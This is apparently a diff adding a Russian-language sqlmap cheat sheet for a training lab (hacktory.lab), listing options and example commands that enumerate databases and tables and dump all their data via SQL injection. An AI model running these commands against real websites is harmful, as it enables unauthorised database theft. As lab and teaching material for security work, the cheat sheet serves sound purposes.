@@ -1,4 +1,26 @@
 ## SQLMAP
+**Опции:**
+
+- `-u --url http://www.hacktory.lab/` – URL цели;
+- `--data` – указываем параметры для тестирования, передающиеся в POST-запросе (например, `data=&quot;txtLoginID=skan&amp;txtPassword=pass&amp;cmdSubmit=Login&quot;`);
+- `--crawl` – сканирование сайта с целевого URL. С помощью этой опции можно выставить глубину, ниже которой sqlmap не будет сканировать (например, --crawl=3);
+- `-f --forms` – парсинг и анализ форм на целевом URL;
+- `-dbs` – ключ для перечисления имеющихся баз данных;
+- `-D db\_name` – указываем конкретную базу данных (например -Ddvwa);
+- `-T table\_name` – указываем конкретную таблицу (например, -Tusers);
+- `--dump-all` – вытягиваем значения из всех перечисленных столбцов.
+
+
+**Примеры использования:**
+
+- `sqlmap --url http://www.hacktory.lab/?id=1` – сканировать параметр id в интерактивном режиме;
+- `sqlmap --url http://www.hacktory.lab/?id=1 --batch` – сканировать параметр id автоматически;
+- `sqlmap --url http://www.hacktory.lab/?id=1 --dbs` – получить список БД;
+- `sqlmap --url http://www.hacktory.lab/?id=1 -D db --tables` – для БД db получить список таблиц;
+- `sqlmap --url http://www.hacktory.lab/?id=1 -D db -T table --dump-all` – для БД db и таблицы table получить все данные.
+
+
+**Другие примеры:**
 ```
 sqlmap --help
 sqlmap -u "<url>" --cookie="name=value"
